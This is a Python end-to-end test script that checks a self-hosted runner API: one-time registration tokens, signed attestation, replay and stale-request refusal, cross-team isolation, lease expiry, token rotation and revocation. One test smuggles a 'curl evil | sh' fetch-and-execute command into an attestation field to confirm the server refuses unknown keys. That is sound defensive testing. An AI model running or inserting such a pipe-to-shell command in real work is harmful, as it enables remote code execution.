#!/usr/bin/env python3
"""W13 deterministic gate: a BYO runner control plane that cannot be replayed or borrowed.

Marathon 2.0 W13 makes the runner a customer-controlled host. Nothing here
needs a chat model: every verdict is read from the product's own state (HTTP
answers plus the durable rows the API wrote), never from the runner's own claim.

Legs:

1. **Registration is a one-time secret.** An admin mints a runner; the token is
   returned once, the list projection never carries it, and the stored row keeps
   only a sha256 plus a one-way attestation key.
2. **Attestation verifies.** A signed confinement claim verifies; a tampered
   signature, a mismatch with the registered confinement, an unknown key and a
   stale/replayed request are each refused before any job state is touched.
3. **Replay protection.** The same nonce twice is refused; a timestamp an hour
   old is refused.
4. **Team isolation.** A stolen team-B token can neither list, claim nor finish
   team-A work: the answer is the same 404 as an unknown id. A team-B admin
   cannot assign or revoke team-A resources either.
5. **Lease lifecycle.** Assignment requires a queued run of the caller's team;
   claiming holds the run_claims lease with worker_id ``runner:<id>``; a second
   claim is refused; heartbeat renews; finish deletes only the runner's claim.
6. **Expiry and revocation.** An expired lease releases the job and ORPHANS the
   run (never re-queues it, or the server could execute work the remote host may
   still be running). Revocation kills the token on the next request, is
   idempotent, and a revoked runner accepts no new jobs.

    python3 scripts/e2e/w13_runner_drill.py
"""

from __future__ import annotations

import hashlib
import hmac
import importlib.util
import json
import secrets
import subprocess
import time
import urllib.error
import urllib.request
from datetime import UTC, datetime
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
OUT = REPO / "docs" / "briefs" / "evidence" / "eval"
P = "/api/v1/orchestrator"
IDENTITY = "http://127.0.0.1:8001"
ATT_LABEL = b"harness-runner-attestation-v1"

spec = importlib.util.spec_from_file_location(
    "tpl", REPO / "scripts" / "e2e" / "w4_web_fetch_engine_drill.py")
tpl = importlib.util.module_from_spec(spec)
assert spec and spec.loader
spec.loader.exec_module(tpl)


# ------------------------------------------------------------------ helpers


def unwrap(body: object) -> dict:
    if not isinstance(body, dict):
        return {}
    detail = body.get("detail")
    return detail if isinstance(detail, dict) else body


def error_code(body: object) -> str:
    error = unwrap(body).get("error")
    return str(error.get("code") or "") if isinstance(error, dict) else ""


def ident(method: str, path: str, token: str | None = None, body: dict | None = None) -> dict:
    status, payload = tpl.http(method, f"{IDENTITY}{path}", token=token, body=body)
    return {"status": status, "code": error_code(payload) or None, "body": unwrap(payload)}


def api(method: str, path: str, token: str, body: dict | None = None) -> dict:
    status, payload = tpl.http(method, f"{tpl.ORCHESTRATOR}{P}{path}", token=token, body=body)
    return {"status": status, "code": error_code(payload) or None, "body": unwrap(payload)}


def psql(statement: str) -> str:
    proc = subprocess.run(
        ["docker", "exec", "harness-db-1", "psql", "-U", "harness", "-d", "harness",
         "-tAc", statement],
        capture_output=True, text=True, check=False,
    )
    if proc.returncode != 0:
        raise SystemExit(f"psql failed: {proc.stderr.strip()}")
    return proc.stdout.strip()


def derive(token: str) -> str:
    return hmac.new(token.encode(), ATT_LABEL, hashlib.sha256).hexdigest()


def canonical(att: dict) -> str:
    return json.dumps(att, sort_keys=True, separators=(",", ":"), ensure_ascii=False)


def sign(att: dict, token: str) -> str:
    return hmac.new(bytes.fromhex(derive(token)), canonical(att).encode(), hashlib.sha256).hexdigest()


def attestation(confinement: str = "docker") -> dict:
    return {
        "schema": 1,
        "confinement": confinement,
        "os": "linux",
        "hostIdSha256": hashlib.sha256(b"w13-drill-host").hexdigest(),
        "runnerVersion": "0.1.0",
        "policyDigest": hashlib.sha256(b"w13-drill-policy").hexdigest(),
    }


def runner_headers(token: str | None, nonce: str | None = None,
                   ts: int | None = None) -> dict:
    headers = {
        "x-runner-nonce": nonce or secrets.token_hex(12),
        "x-runner-timestamp": str(int(time.time()) if ts is None else ts),
    }
    if token is not None:
        headers["authorization"] = f"Bearer {token}"
    return headers


def runner_http(method: str, path: str, token: str | None, body: dict | None = None,
                nonce: str | None = None, ts: int | None = None) -> dict:
    url = f"{IDENTITY}{path}"
    headers = runner_headers(token, nonce, ts)
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if data is not None:
        req.add_header("Content-Type", "application/json")
    for key, value in headers.items():
        req.add_header("-".join(part.capitalize() for part in key.split("-")), value)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            content = resp.read().decode("utf-8", "replace")
            status = resp.status
    except urllib.error.HTTPError as exc:
        content, status = exc.read().decode("utf-8", "replace"), exc.code
    payload = json.loads(content) if content else {}
    return {"status": status, "code": error_code(payload) or None, "body": unwrap(payload)}


def login_team(email: str, team_id: str) -> str:
    """Bind a second principal to an existing team (dev login route).

    Recorded as a harness limitation: OTP verify cannot select a team, so the
    local dev login route mints the team-bound session the drill needs.
    """
    status, body = tpl.http("POST", f"{IDENTITY}/api/v1/auth/login",
                            body={"email": email, "teamId": team_id})
    if status != 200 or not (isinstance(body, dict) and body.get("token")):
        raise SystemExit(f"team-bound login failed: {status} {body!r}")
    return body["token"]


def register_runner(token: str, name: str, confinement: str = "docker") -> dict:
    created = ident("POST", "/api/v1/team-runners", token,
                    {"name": name, "description": "w13 drill host", "confinement": confinement})
    if created["status"] != 201:
        raise SystemExit(f"runner registration failed: {created!r}")
    return created["body"]


def ensure_project(token: str, name: str) -> str:
    status, body = tpl.http("POST", f"{IDENTITY}/api/v1/projects", token=token, body={"name": name})
    if status != 201:
        raise SystemExit(f"project creation failed: {status} {body!r}")
    return body["id"]


def propose_run(token: str, run_id: str, project_id: str) -> None:
    plan = api("POST", f"/runs/{run_id}/plan", token,
               {"goal": "W13 runner drill: no model executes this", "projectId": project_id})
    if plan["status"] != 201 or not plan["body"].get("planId"):
        raise SystemExit(f"plan proposal failed for {run_id}: {plan!r}")


def saturate_team(project_id: str, count: int = 8) -> None:
    """Occupy the team's run cap so the orchestrator's own worker cannot claim
    the partially-seeded run before the runner takes it.

    These are synthetic running claims owned by the drill (worker_id
    ``w13-saturate``); the zombie reaper would release them after the heartbeat
    window, which is far longer than this drill takes. Without this, the
    orchestrator (0.5 s poll) would claim a queued row that has no durable
    EXECUTION_STARTED and requeue it while the drill is mid-flight.
    """
    now = datetime.now(UTC).isoformat()
    for index in range(count):
        psql(
            "INSERT INTO run_claims (run_id, project_id, state, claimed_at, heartbeat_at, "
            f"worker_id) VALUES ('w13sat-{index}-' || left(md5(random()::text), 20), "
            f"'{project_id}', 'running', '{now}', '{now}', 'w13-saturate')"
        )


def queue_run(run_id: str, project_id: str) -> None:
    """Seed the durable queue exactly as the enqueue path does (internal state).

    A real BYO dispatch would call the enqueue seam; the drill seeds the row so
    the orchestrator's own worker cannot race the runner for it.
    """
    now = datetime.now(UTC).isoformat()
    psql(
        "INSERT INTO run_claims (run_id, project_id, state, claimed_at, heartbeat_at, worker_id) "
        f"VALUES ('{run_id}', '{project_id}', 'queued', '{now}', '{now}', 'enqueuer')"
    )


# --------------------------------------------------------------------- main


def main() -> int:
    stamp = int(time.time())
    email_a = f"w13-a-{stamp}@example.com"
    email_b = f"w13-b-{stamp}@example.com"
    token_a = tpl.login(email_a)
    team_a = ident("GET", "/api/v1/me", token_a)["body"]["teamId"]
    token_a = login_team(email_a, team_a)
    token_b = tpl.login(email_b)
    team_b = ident("GET", "/api/v1/me", token_b)["body"]["teamId"]

    project_a = ensure_project(token_a, f"w13 runners {stamp}")
    project_b = ensure_project(token_b, f"w13 runners b {stamp}")
    run_a = f"w13a-{stamp}".ljust(36, "0")
    run_b = f"w13b-{stamp}".ljust(36, "0")
    run_c = f"w13c-{stamp}".ljust(36, "0")
    propose_run(token_a, run_a, project_a)
    propose_run(token_b, run_b, project_b)
    propose_run(token_a, run_c, project_a)
    # Saturate BEFORE queueing: the orchestrator polls every 0.5 s.
    saturate_team(project_a)
    queue_run(run_a, project_a)
    queue_run(run_c, project_a)

    checks: dict[str, bool] = {}
    anonymous = runner_http("POST", "/api/v1/runner/heartbeat", None,
                            {"attestation": {}, "signature": "x"})
    checks["anonymousMalformedBodyIs401"] = anonymous["status"] == 401
    evidence: dict = {
        "schema": 1,
        "kind": "w13-runner",
        "takenAt": datetime.now(UTC).isoformat(),
        "model": "none (deterministic API + durable-row checks)",
        "teamA": team_a,
        "teamB": team_b,
        "projectA": project_a,
        "projectB": project_b,
        "runA": run_a,
        "runB": run_b,
    }

    # ---- 1. registration is a one-time secret
    created = register_runner(token_a, "w13-laptop", "docker")
    token_r = created["token"]
    runner_id = created["runner"]["id"]
    listed = ident("GET", "/api/v1/team-runners", token_a)["body"]["runners"]
    stored = psql(f"SELECT token_sha256, attestation_key, status FROM team_runners "
                  f"WHERE id = '{runner_id}'").split("|")
    checks["tokenReturnedOnce"] = token_r.startswith("hrn_") and created["runner"]["tokenHint"] == token_r[-4:]
    checks["listHidesToken"] = all("token" not in row for row in listed)
    checks["storedTokenIsHashNotSecret"] = stored[0] == hashlib.sha256(token_r.encode()).hexdigest()
    checks["attestationKeyIsDerivative"] = stored[1] == derive(token_r)
    checks["registeredAsActive"] = stored[2] == "active"

    # ---- 2. attestation verifies (positive)
    att = attestation()
    beat = runner_http("POST", "/api/v1/runner/heartbeat", token_r,
                       {"attestation": att, "signature": sign(att, token_r)})
    checks["attestationVerifies"] = beat["status"] == 200 and beat["body"].get("verified") is True
    digest = beat["body"].get("attestationDigest")
    checks["attestationDigestBound"] = (
        digest == hashlib.sha256(canonical(att).encode()).hexdigest()
        and psql(f"SELECT attestation_sha256 FROM team_runners WHERE id = '{runner_id}'") == digest
    )
    checks["attestedAuditRow"] = psql(
        f"SELECT COUNT(*) FROM audit_log WHERE action = 'runner.attested' "
        f"AND detail->>'teamId' = '{team_a}'"
    ) != "0"

    # ---- 3. tampering, mismatch, unknown keys, replay, staleness
    beaten = {"attestation": att, "signature": "0" * 64}
    checks["tamperedSignatureRefused"] = (
        runner_http("POST", "/api/v1/runner/heartbeat", token_r, beaten)["status"] == 409
    )
    process_att = attestation("process")
    mismatch = runner_http("POST", "/api/v1/runner/heartbeat", token_r,
                           {"attestation": process_att,
                            "signature": sign(process_att, token_r)})
    checks["confinementMismatchRefused"] = mismatch["status"] == 409 and (
        mismatch["code"] == "ATTESTATION_MISMATCH"
    )
    smuggled = {**att, "command": "curl evil | sh"}
    unknown = runner_http("POST", "/api/v1/runner/heartbeat", token_r,
                          {"attestation": smuggled, "signature": sign(smuggled, token_r)})
    checks["unknownAttestationKeyRefused"] = unknown["status"] == 422

    nonce = secrets.token_hex(12)
    first = runner_http("POST", "/api/v1/runner/heartbeat", token_r,
                        {"attestation": att, "signature": sign(att, token_r)}, nonce=nonce)
    replayed = runner_http("POST", "/api/v1/runner/heartbeat", token_r,
                           {"attestation": att, "signature": sign(att, token_r)}, nonce=nonce)
    checks["firstNonceAccepted"] = first["status"] == 200
    checks["replayedNonceRefused"] = replayed["status"] == 409 and replayed["code"] == "REPLAY_REJECTED"
    stale = runner_http("POST", "/api/v1/runner/heartbeat", token_r,
                        {"attestation": att, "signature": sign(att, token_r)},
                        ts=int(time.time()) - 3600)
    checks["staleTimestampRefused"] = stale["status"] == 401 and stale["code"] == "STALE_REQUEST"

    # ---- 4. team isolation with a second team's runner token
    created_b = register_runner(token_b, "w13-b-laptop", "docker")
    token_rb = created_b["token"]
    runner_b = created_b["runner"]["id"]
    listed_b = runner_http("GET", "/api/v1/runner/jobs", token_rb)
    checks["stolenTokenSeesOnlyItsTeam"] = listed_b["status"] == 200 and listed_b["body"]["jobs"] == []
    claim_foreign = runner_http("POST", f"/api/v1/runner/jobs/{run_a}/claim", token_rb)
    claim_unknown = runner_http("POST", f"/api/v1/runner/jobs/{'w13z-' + str(stamp)}/claim", token_rb)
    checks["stolenTokenCannotClaim"] = claim_foreign["status"] == 404
    checks["foreignAndUnknownAreIdentical"] = claim_foreign["body"] == claim_unknown["body"]
    finish_foreign = runner_http("POST", f"/api/v1/runner/jobs/{run_a}/finish", token_rb,
                                 {"status": "completed"})
    checks["stolenTokenCannotFinish"] = finish_foreign["status"] == 404
    assign_foreign = ident("POST", f"/api/v1/team-runners/{runner_b}/jobs", token_b, {"runId": run_a})
    assign_unknown = ident("POST", f"/api/v1/team-runners/{runner_b}/jobs", token_b,
                           {"runId": f"w13z-{stamp}".ljust(36, "0")})
    checks["foreignAssignIsNotFound"] = assign_foreign["status"] == 404 and (
        assign_foreign["body"] == assign_unknown["body"]
    )
    revoke_foreign = ident("POST", f"/api/v1/team-runners/{runner_id}/revoke", token_b)
    checks["foreignRevokeIsNotFound"] = revoke_foreign["status"] == 404
    list_b = ident("GET", "/api/v1/team-runners", token_b)["body"]["runners"]
    checks["teamListIsScoped"] = [row["id"] for row in list_b] == [runner_b]

    # ---- 5. lease lifecycle on run A
    assigned = ident("POST", f"/api/v1/team-runners/{runner_id}/jobs", token_a, {"runId": run_a})
    checks["assignRequiresQueuedRun"] = assigned["status"] == 201 and (
        assigned["body"]["job"]["state"] == "offered"
    )
    not_queued = ident("POST", f"/api/v1/team-runners/{runner_id}/jobs", token_a, {"runId": run_a})
    checks["duplicateAssignmentRefused"] = not_queued["status"] == 409
    visible = runner_http("GET", "/api/v1/runner/jobs", token_r)
    checks["runnerSeesItsOffer"] = [job["runId"] for job in visible["body"]["jobs"]] == [run_a]

    claim = runner_http("POST", f"/api/v1/runner/jobs/{run_a}/claim", token_r)
    lease = psql(f"SELECT state, worker_id FROM run_claims WHERE run_id = '{run_a}'").split("|")
    checks["claimHoldsTheRunClaim"] = claim["status"] == 200 and lease == ["running", f"runner:{runner_id}"]
    second = runner_http("POST", f"/api/v1/runner/jobs/{run_a}/claim", token_r)
    checks["secondClaimRefused"] = second["status"] == 409 and second["code"] == "JOB_NOT_OFFERED"
    renewed = runner_http("POST", f"/api/v1/runner/jobs/{run_a}/heartbeat", token_r)
    checks["leaseHeartbeatRenews"] = renewed["status"] == 200 and renewed["body"]["state"] == "running"

    finished = runner_http("POST", f"/api/v1/runner/jobs/{run_a}/finish", token_r,
                           {"status": "completed",
                            "resultDigest": hashlib.sha256(b"w13 result").hexdigest()})
    checks["finishCompletesTheJob"] = finished["status"] == 200 and finished["body"]["state"] == "completed"
    checks["finishReleasesTheClaim"] = psql(
        f"SELECT COUNT(*) FROM run_claims WHERE run_id = '{run_a}'"
    ) == "0"
    checks["finishAuditRow"] = psql(
        f"SELECT COUNT(*) FROM audit_log WHERE action = 'runner.job_completed' "
        f"AND detail->>'teamId' = '{team_a}'"
    ) != "0"

    # ---- 6. expiry orphans, never re-queues
    ident("POST", f"/api/v1/team-runners/{runner_id}/jobs", token_a, {"runId": run_c})
    runner_http("POST", f"/api/v1/runner/jobs/{run_c}/claim", token_r)
    psql(
        "UPDATE runner_jobs SET lease_expires_at = now() - interval '1 hour' "
        f"WHERE run_id = '{run_c}'"
    )
    expired = runner_http("POST", f"/api/v1/runner/jobs/{run_c}/heartbeat", token_r)
    checks["expiredLeaseRefused"] = expired["status"] == 409
    checks["expiredRunIsOrphanedNotQueued"] = psql(
        f"SELECT state FROM run_claims WHERE run_id = '{run_c}'"
    ) == "orphaned"
    checks["expiredJobReleased"] = psql(
        f"SELECT state FROM runner_jobs WHERE run_id = '{run_c}'"
    ) == "released"

    # ---- 7. rotation: new token works, the old token and key die immediately
    rotated = ident("POST", f"/api/v1/team-runners/{runner_id}/rotate", token_a)
    new_token = rotated["body"].get("token", "") if rotated["status"] == 200 else ""
    checks["rotateReturnsNewToken"] = rotated["status"] == 200 and new_token.startswith("hrn_")
    old_dead = runner_http("POST", "/api/v1/runner/heartbeat", token_r,
                           {"attestation": att, "signature": sign(att, token_r)})
    checks["rotatedOldTokenDead"] = old_dead["status"] == 401
    new_alive = runner_http("POST", "/api/v1/runner/heartbeat", new_token,
                            {"attestation": att, "signature": sign(att, new_token)})
    checks["rotatedNewTokenWorks"] = new_alive["status"] == 200
    checks["rotateAuditRow"] = psql(
        f"SELECT COUNT(*) FROM audit_log WHERE action = 'runner.rotated' "
        f"AND detail->>'teamId' = '{team_a}'"
    ) != "0"
    token_r = new_token

    # ---- 8. revocation is instant and idempotent
    revoked = ident("POST", f"/api/v1/team-runners/{runner_id}/revoke", token_a)
    again = ident("POST", f"/api/v1/team-runners/{runner_id}/revoke", token_a)
    checks["revokeIsIdempotent"] = revoked["status"] == 204 and again["status"] == 204
    dead = runner_http("POST", "/api/v1/runner/heartbeat", token_r,
                       {"attestation": att, "signature": sign(att, token_r)})
    checks["revokedTokenIsDead"] = dead["status"] == 401
    no_jobs = ident("POST", f"/api/v1/team-runners/{runner_id}/jobs", token_a, {"runId": run_c})
    checks["revokedRunnerTakesNoJobs"] = no_jobs["status"] == 409 and no_jobs["code"] == "RUNNER_REVOKED"
    revoke_b = ident("POST", f"/api/v1/team-runners/{runner_b}/revoke", token_b)
    checks["secondTeamRevokeWorks"] = revoke_b["status"] == 204

    # Remove the cap-saturating rows so the residual count reflects only the
    # lifecycle work this drill actually performed.
    psql(f"DELETE FROM run_claims WHERE worker_id = 'w13-saturate' AND project_id = '{project_a}'")

    evidence["checks"] = checks
    evidence["verdict"] = "PASS" if all(checks.values()) else "FAIL"
    evidence["failedChecks"] = [key for key, ok in checks.items() if not ok]
    evidence["residual"] = {
        "runnersA": psql(f"SELECT COUNT(*) FROM team_runners WHERE team_id = '{team_a}'"),
        "runnersB": psql(f"SELECT COUNT(*) FROM team_runners WHERE team_id = '{team_b}'"),
        "liveClaims": psql(
            "SELECT COUNT(*) FROM run_claims WHERE state IN ('queued', 'running') "
            f"AND project_id IN ('{project_a}', '{project_b}')"
        ),
    }
    evidence["limitations"] = [
        (
            "The customer host is simulated by the drill process: it signs attestations "
            "and drives the runner API, but it does not yet execute the approved plan. "
            "The execution leg (engine + event streaming on the runner) remains OPEN."
        ),
        (
            "queued run_claims rows are seeded straight into the durable queue because "
            "the product has no BYO dispatch endpoint yet; the drill never starts the "
            "orchestrator's own worker for these runs."
        ),
        (
            "The second team's session is minted through the local dev login route: OTP "
            "verify cannot select a team after invite redemption."
        ),
        "One host, one database: isolation is proven across teams, not hosts.",
    ]

    OUT.mkdir(parents=True, exist_ok=True)
    path = OUT / f"w13-runner-{stamp}.json"
    path.write_text(json.dumps(evidence, indent=2, default=str) + "\n", encoding="utf-8")
    print(json.dumps({
        "verdict": evidence["verdict"],
        "failed": evidence["failedChecks"],
        "checks": len(checks),
        "evidence": str(path),
    }))
    return 0 if evidence["verdict"] == "PASS" else 1


if __name__ == "__main__":
    raise SystemExit(main())
